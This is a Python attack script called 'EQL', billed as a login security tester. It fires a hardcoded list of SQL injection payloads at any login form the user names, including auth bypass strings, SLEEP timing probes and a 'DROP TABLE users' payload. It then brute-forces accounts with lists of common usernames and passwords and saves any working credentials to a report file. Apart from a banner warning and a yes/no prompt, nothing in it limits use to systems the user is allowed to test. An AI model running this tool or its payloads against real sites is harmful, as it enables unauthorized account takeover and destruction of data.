#!/usr/bin/env python3

import requests
import time
import sys
import os
from datetime import datetime

print("""
╔═══════════════════════════════════════════════════════════╗
║  EQL - SQL INJECTION & LOGIN SECURITY TESTER v2.0        ║
║  Purpose: Test website login security & SQL injection    ║
║  Developer: Security Research Tool                       ║
║  Warning: Unauthorized testing is illegal                ║
╚═══════════════════════════════════════════════════════════╝
""")

response = input("Accept terms? (yes/no): ")
if response.lower() != 'yes':
    print("Exiting...")
    sys.exit(0)

class EQL:
    def __init__(self):
        self.vulnerabilities = []
        self.valid_creds = []
        self.success_keywords = []
        self.failure_keywords = []
        self.payloads = [
            "' OR '1'='1' --", "' OR '1'='1' #", "' OR '1'='1' /*", "' OR 1=1 --",
            "' OR 1=1 #", "' OR 1=1 /*", "' OR 'x'='x", "admin' --", "admin' #",
            "admin' /*", "' UNION SELECT 1,2,3 --", "' UNION SELECT 1,2,3,4,5 --",
            "' AND 1=1 --", "' AND SLEEP(5) --", "' OR SLEEP(5) --", "admin' OR '1'='1' --",
            "admin' OR 1=1 --", "' OR 1=1 LIMIT 1 --", "' OR '1'='1' LIMIT 1 --",
            "' OR EXISTS(SELECT * FROM users) --", "'; SELECT * FROM users --",
            "admin' AND 1=1 --", "admin' AND SLEEP(3) --", "' OR '1'='1' AND SLEEP(3) --",
            "admin' OR 'a'='a", "1' OR '1'='1", "' OR username='admin' --",
            "admin'-- -", "admin'#", "admin'/**/", "' UNION SELECT NULL,NULL,NULL,NULL --",
            "' UNION SELECT 1,2,3,4,5,6,7,8,9,10 --", "' AND (SELECT * FROM (SELECT(SLEEP(5)))a) --",
            "' OR (SELECT * FROM (SELECT(SLEEP(5)))a) --", "'; DROP TABLE users; --",
            "admin' OR '1'='1'#", "admin' OR '1'='1'/*", "' OR '1'='1'#", "' OR '1'='1'/*",
            "1' OR 1=1#", "1' OR 1=1/*", "' OR 1=1 ORDER BY 1--", "' OR 1=1 ORDER BY 2--"
        ]

    def get_failure_message(self):
        print("\n" + "="*60)
        print("LOGIN RESPONSE DETECTION SETUP")
        print("="*60)
        print("\nTo accurately detect successful and failed logins,")
        print("enter keywords that appear on the login page when:")
        print("- Login FAILS (wrong password)")
        print("- Login SUCCESS (logged in)\n")
        
        print("Enter failure keywords (text that appears when login fails)")
        print("Example: 'Invalid password', 'Login failed', 'Incorrect'")
        failure_input = input("Failure keywords (comma separated): ")
        self.failure_keywords = [k.strip().lower() for k in failure_input.split(',') if k.strip()]
        
        print("\nEnter success keywords (text that appears when login succeeds)")
        print("Example: 'Dashboard', 'Welcome', 'Logout', 'Admin panel'")
        success_input = input("Success keywords (comma separated): ")
        self.success_keywords = [k.strip().lower() for k in success_input.split(',') if k.strip()]
        
        if not self.failure_keywords:
            self.failure_keywords = ["invalid", "incorrect", "failed", "error"]
            print(f"\n[!] Using default failure keywords: {self.failure_keywords}")
        
        if not self.success_keywords:
            self.success_keywords = ["dashboard", "welcome", "logout", "admin"]
            print(f"[!] Using default success keywords: {self.success_keywords}")

    def create_preset_usernames(self):
        return ["admin", "Administrator", "root", "user", "test", "guest", "admin1", 
                "webadmin", "sysadmin", "manager", "support", "info", "contact", 
                "webmaster", "operator", "superuser", "supervisor", "owner", "master"]

    def create_preset_passwords(self):
        return ["admin", "password", "123456", "12345678", "1234", "qwerty", "abc123", 
                "admin123", "root", "letmein", "welcome", "passw0rd", "password123", 
                "admin@123", "admin#123", "123456789", "12345", "111111", "adminadmin"]

    def get_wordlist(self, wordlist_type):
        print(f"\n--- {wordlist_type} List ---")
        print("1. Use preset list")
        print("2. Use custom file path")
        choice = input("Select (1/2): ")
        
        if choice == '2':
            path = input(f"Enter path to {wordlist_type.lower()} file: ")
            if os.path.exists(path):
                with open(path, 'r') as f:
                    return [line.strip() for line in f if line.strip()]
        if wordlist_type == "Username":
            return self.create_preset_usernames()
        else:
            return self.create_preset_passwords()

    def test_login(self, url, username, password, user_field, pass_field, submit_field):
        try:
            data = {user_field: username, pass_field: password, submit_field: "Login"}
            start = time.time()
            response = requests.post(url, data=data, timeout=10, allow_redirects=True)
            elapsed = time.time() - start
            
            content = response.text.lower()
            final_url = response.url.lower()
            
            if any(keyword in content or keyword in final_url for keyword in self.success_keywords):
                return True, elapsed, "Success keyword matched"
            
            if any(keyword in content or keyword in final_url for keyword in self.failure_keywords):
                return False, elapsed, "Failure keyword matched"
            
            if response.status_code == 302 and "login" not in final_url:
                return True, elapsed, "Redirect detected"
            
            if elapsed > 4:
                return True, elapsed, "Time delay detected"
            
            if "login" not in final_url and len(content) > 500:
                return True, elapsed, "Content length changed"
            
            return False, elapsed, "No clear indicator"
            
        except Exception as e:
            return False, 0, f"Error: {str(e)}"

    def sql_injection_test(self, url, user_field, pass_field, submit_field):
        print("\n" + "="*60)
        print("SQL INJECTION TESTING IN PROGRESS")
        print("="*60)
        
        for i, payload in enumerate(self.payloads, 1):
            print(f"[{i}/{len(self.payloads)}] Testing: {payload[:40]}...")
            success, elapsed, msg = self.test_login(url, payload, "x", user_field, pass_field, submit_field)
            if success:
                print(f"    [!] VULNERABLE! {msg} (Time: {elapsed:.2f}s)")
                self.vulnerabilities.append({"payload": payload, "response": msg, "time": f"{elapsed:.2f}s"})
            else:
                print(f"    [.] Not vulnerable - {msg}")
            time.sleep(0.3)
        return self.vulnerabilities

    def brute_force_test(self, url, user_field, pass_field, submit_field, usernames, passwords):
        print("\n" + "="*60)
        print("BRUTE FORCE TESTING IN PROGRESS")
        print("="*60)
        
        total = len(usernames) * len(passwords)
        current = 0
        
        for username in usernames:
            for password in passwords:
                current += 1
                print(f"[{current}/{total}] Testing: {username}:{password}")
                success, elapsed, msg = self.test_login(url, username, password, user_field, pass_field, submit_field)
                if success:
                    print(f"    [!!!] FOUND! {username}:{password} - {msg}")
                    self.valid_creds.append({"username": username, "password": password, "response": msg})
                time.sleep(0.2)
        return self.valid_creds

    def save_report(self):
        filename = "scan.txt"
        with open(filename, 'w') as f:
            f.write("="*80 + "\n")
            f.write(f"EQL SCAN REPORT - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write("="*80 + "\n\n")
            
            f.write("DETECTION KEYWORDS USED:\n")
            f.write("-"*60 + "\n")
            f.write(f"Success Keywords: {', '.join(self.success_keywords)}\n")
            f.write(f"Failure Keywords: {', '.join(self.failure_keywords)}\n\n")
            
            f.write("SQL INJECTION VULNERABILITIES:\n")
            f.write("-"*60 + "\n")
            if self.vulnerabilities:
                for v in self.vulnerabilities:
                    f.write(f"Payload: {v['payload']}\n")
                    f.write(f"Indicator: {v['response']}\n")
                    f.write(f"Time: {v['time']}\n\n")
            else:
                f.write("No SQL injection vulnerabilities detected.\n\n")
            
            f.write("VALID CREDENTIALS FOUND:\n")
            f.write("-"*60 + "\n")
            if self.valid_creds:
                for c in self.valid_creds:
                    f.write(f"Username: {c['username']}\n")
                    f.write(f"Password: {c['password']}\n")
                    f.write(f"Response: {c['response']}\n\n")
            else:
                f.write("No valid credentials found.\n\n")
            
            f.write("="*80 + "\n")
            f.write("End of Report\n")
        
        print(f"\n[+] Report saved to {filename}")

    def run(self):
        print("\n[+] Enter target information")
        url = input("Login URL: ")
        user_field = input("Username field name: ")
        pass_field = input("Password field name: ")
        submit_field = input("Submit button name: ")
        
        self.get_failure_message()
        
        print("\n[+] Select testing mode")
        print("1. SQL Injection Only")
        print("2. Brute Force Only")
        print("3. Full Test (Both)")
        mode = input("Mode (1/2/3): ")
        
        usernames = []
        passwords = []
        
        if mode in ['2', '3']:
            usernames = self.get_wordlist("Username")
            passwords = self.get_wordlist("Password")
            print(f"[+] Loaded {len(usernames)} usernames, {len(passwords)} passwords")
        
        if mode in ['1', '3']:
            self.sql_injection_test(url, user_field, pass_field, submit_field)
        
        if mode in ['2', '3']:
            self.brute_force_test(url, user_field, pass_field, submit_field, usernames, passwords)
        
        self.save_report()
        
        print("\n" + "="*60)
        print("SCAN COMPLETE")
        print("="*60)
        print(f"SQL Injection Findings: {len(self.vulnerabilities)}")
        print(f"Valid Credentials Found: {len(self.valid_creds)}")
        print("="*60)

if __name__ == "__main__":
    try:
        tool = EQL()
        tool.run()
    except KeyboardInterrupt:
        print("\n[!] Scan interrupted")
        sys.exit(0)
    except Exception as e:
        print(f"\n[!] Error: {e}")
        sys.exit(1)